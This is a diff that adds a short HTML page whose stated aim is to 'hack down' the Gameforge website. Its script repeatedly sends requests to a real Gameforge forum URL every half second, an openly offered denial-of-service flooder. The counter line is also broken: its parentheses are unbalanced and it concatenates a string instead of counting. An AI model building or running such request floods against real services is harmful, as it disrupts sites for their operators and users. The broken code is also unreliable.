@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta name="description" content="I'm gonna hack down Gameforge website">
+  <meta name="author" content="Me neither as you">
+  <title data-ng-bind="title">Hello Gameforge</title>
+</head>
+<body>
+
+<h1>Requests number: <span id="requestsNumber">0</span>
+
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+<script>
+    $(function() {
+
+      _do();
+
+      function _do() {
+      $('#requestsNumber').text(parseInt($('#requestsNumber').text() + 1);
+        $.get('https://board.es.aion.gameforge.com/index.php/BoardQuickSearch/?mode=unreadPosts')
+          .done(function(data) { setTimeout(_do, 500); })
+          .fail(function(error) { setTimeout(_do, 500); });
+      }
+    });
+  </script>
+  
+</body>
+</html>
